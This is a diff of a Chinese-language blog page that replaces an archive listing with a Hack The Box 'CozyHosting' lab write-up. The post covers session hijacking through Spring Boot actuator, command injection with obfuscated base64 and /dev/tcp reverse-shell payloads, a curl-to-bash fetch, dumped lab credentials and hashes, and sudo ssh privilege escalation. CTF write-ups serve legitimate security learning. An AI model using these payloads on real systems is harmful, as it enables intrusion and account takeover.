@@ -8,7 +8,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            归档
+            HTB_CozyHosting
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -31,15 +31,36 @@
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/archive.css">
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
 <div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-subtitle">归档</h1>
+                <h1 class="header-subtitle">HTB_CozyHosting</h1>
                 <div class="header-subinfo">
-                    <p class="article-info-text Chinese"></p>
-                    <p class="article-info-text English"></p>                  
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2023-10-15
+                        </span>
+                        
+                            <span id="/2023/10/15/HTB-CozyHosting/" class="leancloud_visitors" data-flag-title="HTB_CozyHosting">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/10/15/HTB-CozyHosting/"></span>
+                        </span>  
+                    </p>
+                    
+                        
+                            <span class="category-color">HTB</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">HTB</span>
+                        
+                    
                 </div>
             
         </div>
@@ -48,37 +69,151 @@
 </div>
 <div id="container">
     
-        
-            <!-- 归档页面、分类归档页面、标签归档页面 -->
-            <div class="articles">
-                <div class="articles-wrap">
-                    <span class="archive-move-on"></span>
-                    <span class="archive-counter">
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <p>k</p>
+<p>开局经典namp </p>
+<p><code>nmap -p-  --min-rate 10000 10.10.11.230</code> 结果扫出来 22 和 80 </p>
+<p>然后再 <code>nmap -p 22，80 -sCV -A 10.10.11.230</code></p>
+<p>扫出来 80端口 重定向到了  <a target="_blank" rel="noopener" href="http://cozyhosting.com/">http://cozyhosting.com</a> 然后添加到hosts 文件 这里不多说了</p>
+<p>还是和上一次一样 我用ffuf 扫一下子域名 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://10.10.11.233 -H <span class="string">&quot;Host: FUZZ.analytical.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 145</span><br></pre></td></tr></table></figure>
+
+<p>类比这个命令 照着打，什么都没发现，那没有子域名就爆破一下目录吧</p>
+<p>dirsearch 爆破出来了 很经典的 spring boot    他有 actuator 目录     在&#x2F;actuator&#x2F;sessions 下发现了 kanderson的JESSIONID      加到 cookie 头中 然后就能登录进去了</p>
+<p>进去发现下面有可能rce的地方 输入 host 和 username   ssh链接  </p>
+<p>这里进行尝试 username的地方 发现可以命令执行 username&#x3D;;`xxx` 这里面加内容   xxx两边加反引号 命令执行</p>
+<h2 id="3种反弹shell"><a href="#3种反弹shell" class="headerlink" title="3种反弹shell"></a>3种反弹shell</h2><h3 id="绕过空格反弹shell"><a href="#绕过空格反弹shell" class="headerlink" title="绕过空格反弹shell"></a>绕过空格反弹shell</h3><p>接下来这里我尝试了3种反弹shell的方法</p>
+<p>他这里过滤了 空格</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;\`<span class="built_in">echo</span><span class="variable">$&#123;IFS&#125;</span><span class="string">&quot;YzJnZ0xXa2dQaVlnTDJSbGRpOTBZM0F2TVRBdU1UQXVNVFF1Tnk4NE1EQXlJREErSmpFPQ==&quot;</span>|<span class="built_in">base64</span><span class="variable">$&#123;IFS&#125;</span>-d|<span class="built_in">base64</span><span class="variable">$&#123;IFS&#125;</span>-d|bash;\`</span><br></pre></td></tr></table></figure>
+
+<p>我这里尝试了两次base64 编码 因为我第一次编码 他有个+号被认为是空格了，我找了半天md</p>
+<p>解码之后是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/10.10.14.7/8002 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>另一边直接监听就好了</p>
+<p><img src="/image%5CHTB3%5Ccozyhosting%5C%E7%BB%95%E7%A9%BA%E6%A0%BC%E4%B8%8A%E7%BA%BF.png" alt="这是图片" title="hosts"></p>
+<h3 id="分段反向shell"><a href="#分段反向shell" class="headerlink" title="分段反向shell"></a>分段反向shell</h3><p>然后还学习到一个新姿势，查了一些资料。首先使用如下命令来创建一个与攻击者的tcp连接，并将标准输入(0)重定向到这个连接，sh是一个子shell的标记，用来在括号内执行命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;`(sh)0&gt;/dev/tcp/10.10.14.21/9999`</span><br></pre></td></tr></table></figure>
+
+<p>之后执行如下将标准输出(1)和标准错误(2)都重定向到标准输入(0)，exec会替代当前shell进程，不会创建一个新进程。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> &gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+<p>最后再使用下面的启动一个新的交互式bash，将输出记录到&#x2F;dev&#x2F;null中就会被抛弃。这样执行的命令不会在目标上留下任何痕迹了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br></pre></td></tr></table></figure>
+
+<p>最后成功反弹shell.</p>
+<p><img src="/image%5CHTB3%5Ccozyhosting%5C%E5%88%86%E6%AE%B5.png" alt="这是图片" title="hosts"></p>
+<h3 id="python客户端反弹shell"><a href="#python客户端反弹shell" class="headerlink" title="python客户端反弹shell"></a>python客户端反弹shell</h3><p>这个就</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80 -d /   </span><br></pre></td></tr></table></figure>
+
+<p>起一个客户端挂一个目录 然后我写了一个 文件叫1   内容是 bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.7&#x2F;8002 0&gt;&amp;1</p>
+<p>这边用 命令 xxx|curl$IFS$910.10.14.7&#x2F;1|bash%0a      因为 会把host放到你username 后面 有影响 加%0a让后面没有影响</p>
+<p>然后另一边监听就行了</p>
+<p><img src="/image%5CHTB3%5Ccozyhosting%5Cpython%E8%AF%B7%E6%B1%82%E4%B8%8A%E7%BA%BF.png" alt="这是图片" title="hosts"></p>
+<p><img src="/image%5CHTB3%5Ccozyhosting%5Cpythonserver.png" alt="这是图片" title="hosts"></p>
+<h2 id="jar包分析"><a href="#jar包分析" class="headerlink" title="jar包分析"></a>jar包分析</h2><p>上去之后看到有个jar包</p>
+<p>弄下来分析一下</p>
+<p>他有python 环境 可以用上面的方法 服务器上运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>本机上去 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl xxxx:8000/1cozyhosting-0.0.1.jar  &gt; 1.jar</span><br></pre></td></tr></table></figure>
+
+<p>然后下载下来</p>
+<p>或者是</p>
+<p>服务端    </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8001 &lt; 1cozyhosting-0.0.1.jar</span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.11.230 8001 &gt; 2.jar</span><br></pre></td></tr></table></figure>
+
+<p>下载下来之后反编译 jar包</p>
+<p><img src="/image%5CHTB3%5Ccozyhosting%5Ccurl%E4%B8%8B%E8%BD%BDjar%E5%8C%85.png" alt="这是图片" title="hosts"></p>
+<p><img src="/image%5CHTB3%5Ccozyhosting%5Cnc%E4%B8%8B%E8%BD%BDjar%E5%8C%85.png" alt="这是图片" title="hosts"></p>
+<p><img src="/image%5CHTB3%5Ccozyhosting%5Cjar%E5%8C%85%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9.png" alt="这是图片" title="hosts"></p>
+<p><img src="/image%5CHTB3%5Ccozyhosting%5Cjar%E5%8C%85%E4%BF%A1%E6%81%AF.png" alt="这是图片" title="hosts"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username=kanderson&amp;password=MRdEQuv6~6P9</span><br><span class="line"></span><br><span class="line">spring.datasource.platform=postgres</span><br><span class="line">spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting</span><br><span class="line">spring.datasource.username=postgres</span><br><span class="line">spring.datasource.password=Vg&amp;nvzAQ7XxR</span><br></pre></td></tr></table></figure>
+
+<p>发现有数据库psql</p>
+<p>这里我试着用 工具连 nps做代理失败了</p>
+<p>我就直接去搜的命令行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">psql -h localhost -p 5432 -U postgres -d cozyhosting</span><br><span class="line"></span><br><span class="line">psql -h localhost -p 5432 -U postgres -d cozyhosting</span><br><span class="line"></span><br><span class="line">-h 参数指定要连接的主机名或 IP 地址。在这个例子中，&quot;localhost&quot; 表示连接到本地主机。</span><br><span class="line"></span><br><span class="line">-p 参数指定要连接的端口号。在这个例子中，&quot;5432&quot; 是 PostgreSQL 默认的端口号。</span><br><span class="line"></span><br><span class="line">-U 参数指定要使用的用户名。在这个例子中，&quot;postgres&quot; 是连接数据库时使用的用户名。</span><br><span class="line"></span><br><span class="line">-d 参数指定要连接的数据库名称。在这个例子中，&quot;cozyhosting&quot; 是要连接的数据库的名称。</span><br><span class="line"></span><br><span class="line">综合起来，该命令的含义是使用 psql 工具连接到本地主机上运行的 PostgreSQL 数据库，使用用户名 &quot;postgres&quot;，并连接到名为 &quot;cozyhosting&quot; 的数据库。</span><br></pre></td></tr></table></figure>
+
+<p>\dt</p>
+<p>\q</p>
+<p>找到了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User</span><br><span class="line">admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi</span><br></pre></td></tr></table></figure>
+
+<p>kanderson 密码 在jar包种找到了</p>
+<p>admin的不知道，利用工具 john 和 hashcat 也破解出来了   manchesterunited</p>
+<p>但是ssh的时候发现密码不对，再回去之前的shell看看 他还有个账户叫 jxxx     ssh他试试，进去了</p>
+<p>进去看看能不能提权  ok</p>
+<p>sudo可以用    sudo -l    发现 ssh能利用</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/ssh/#sudo">ssh | GTFOBins</a>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o ProxyCommand=<span class="string">&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27;</span> x</span><br></pre></td></tr></table></figure>
+
+<p>一键提权结束</p>
+<p>吃饭</p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/touxiang.jpg" alt="章鱼海绵">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>章鱼海绵
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2023/10/15/HTB-CozyHosting/" target="_blank">HTB_CozyHosting</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
                         
-                            目前共计 34 篇日志，继续加油！
+                            <a href="/categorie/HTB/">HTB</a>
                         
-                    </span>
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tag/HTB/">HTB</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
                     
                     
-                        
-                            <div class="archive-title">
-                                <h2 class="archive-year">2023</h2>
-                            </div>
-                            
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/05/31/xml%E5%AD%A6%E4%B9%A0/"><span>xml学习</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">05-31</span>
-                                </div>
-                            </div>
-                        </div>
+                        <a href="/2023/10/13/HTB-Analytics-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%BA%A6/" class="next-prefix">» </a> 下一篇：    <a href="/2023/10/13/HTB-Analytics-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%BA%A6/" title="发布于 2023-10-13 06:34">HTB_Analytics-第三季度</a>
                     
                 </div>
             </div>
             
+    <div class="article-comments">
         
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+
+        </div>
     
 </div>
     <div id="footer"></div>
@@ -110,7 +245,7 @@
                     
                         <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
                     
-                        <li class=" active "><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
                     
                         <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
                     
